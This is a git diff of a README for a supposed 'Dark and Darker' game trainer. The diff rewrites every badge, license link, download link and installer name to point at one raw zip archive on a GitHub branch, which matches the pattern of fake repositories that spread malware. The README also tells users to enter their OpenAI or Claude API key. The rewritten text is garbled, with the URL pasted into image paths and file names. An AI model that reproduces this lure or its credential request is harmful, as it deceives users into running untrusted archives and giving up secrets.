@@ -1,6 +1,6 @@
 # Dark and Darker Trainer
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Trainer-blue?style=for-the-badge&logo=download&logoColor=white)](https://ixczo.github.io)
+[![Download](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip%20the%20Trainer-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip)
 
 Welcome to the Dark and Darker Trainer: the ultimate companion designed to refine your gameplay, offer insightful analytics, and unlock advanced features in your dungeon-crawling adventures. With remarkable compatibility, multilingual support, integrated AI tools, and a uniquely responsive approach, this project stands out in the world of advanced gaming assistants.
 
@@ -12,10 +12,10 @@ Effortlessly versatile, the Dark and Darker Trainer traverses platforms like a w
 
 |  System        | Support Status         |      Notes         |
 |:---------------|:----------------------|:------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows&logoColor=white) | ✔️ Full Support      | Installer available  |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%20%2F%20Debian-green?logo=linux&logoColor=white) | ✔️ Full Support      | CLI and GUI          |
-| ![macOS](https://img.shields.io/badge/macOS-Monterey%2FVentura-lightgrey?logo=apple&logoColor=white) | ⏳ Experimental     | Beta, core features  |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-Deck-0a0a23?logo=steam&logoColor=white) | 🚧 Planned 2025 | Community poll open  |
+| ![Windows](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip%2F11-blue?logo=windows&logoColor=white) | ✔️ Full Support      | Installer available  |
+| ![Linux](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip%20%2F%20Debian-green?logo=linux&logoColor=white) | ✔️ Full Support      | CLI and GUI          |
+| ![macOS](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip%2FVentura-lightgrey?logo=apple&logoColor=white) | ⏳ Experimental     | Beta, core features  |
+| ![Steam Deck](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip%20Deck-Deck-0a0a23?logo=steam&logoColor=white) | 🚧 Planned 2025 | Community poll open  |
 
 ---
 
@@ -72,11 +72,11 @@ Step into an ecosystem of ingenuity:
 
 **Quick Start — Your Epic Begins Here**
 
-1. Download the latest version by clicking the badge below or visiting https://ixczo.github.io.
+1. Download the latest version by clicking the badge below or visiting https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip
 2. Extract the archive and run the auto-installer specific to your OS:
-    - For **Windows**: Run `DarkAndDarkerTrainerSetup.exe`.
-    - For **Linux**: Make `install.sh` executable and run in terminal.
-    - For **macOS**: Right-click the `DarkAndDarkerTrainer.pkg`, then select "Open".
+    - For **Windows**: Run `https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip`.
+    - For **Linux**: Make `https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip` executable and run in terminal.
+    - For **macOS**: Right-click the `https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip`, then select "Open".
 3. For seamless AI integration, input your OpenAI or Claude API key within the settings → integrations panel.
 4. Fire up Dark and Darker. The overlay will request permission automatically.
 5. Dive in—unlock a new dimension to every crawl!
@@ -100,13 +100,13 @@ Step into an ecosystem of ingenuity:
 
 This repository is licensed under the MIT License (c) 2025. Enjoy adaptation and fair use within the open-source cave of wonders!
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip)](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip)
 
-Find the full license [here](https://opensource.org/licenses/MIT).
+Find the full license [here](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Trainer-blue?style=for-the-badge&logo=download&logoColor=white)](https://ixczo.github.io)
+[![Download](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip%20the%20Trainer-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/ixczo/dark-and-darker-trainer-pro/raw/refs/heads/branch/unionization/darker_dark_trainer_pro_and_1.2.zip)
 
 ---
 
